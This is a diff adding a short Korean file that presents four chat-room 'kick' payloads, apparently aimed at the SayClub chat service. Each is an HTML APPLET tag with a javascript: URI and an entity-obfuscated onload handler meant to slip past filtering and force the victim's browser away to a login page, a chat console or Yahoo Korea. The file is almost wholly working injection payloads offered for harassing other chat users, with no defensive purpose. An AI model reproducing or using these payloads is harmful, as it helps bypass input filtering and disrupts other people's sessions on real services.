@@ -1,0 +1,6 @@
+﻿이 퍽들은 직접적으로 컴을 다운시키진 못하지만 대화방에서 나가게 하는 퍽들입니다...
+
+로긴에라퍽 <APPLET DATA=javascript:window.top.location="http://www10.sayclub.com/chat/chconsole.html" &#111nload="http://www10.sayclub.com/chat/chconsole.html"></APPLET>  
+로긴퍽 <APPLET DATA=javascript:window.top.location="http://www.sayclub.com/login.nwz" &#111nload="http://www.sayclub.com/login.nwz"></APPLET>    
+로긴퍽 <APPLET DATA=javascript:window.top.location="http://www.yahoo.co.kr" &#111nload="http://www.yahoo.co.kr"></APPLET> 
+로긴퍽 <APPLET DATA=javascript:window.top.location="http://www.sayclub.com" &#111nload="http://www.sayclub.com"></APPLET>
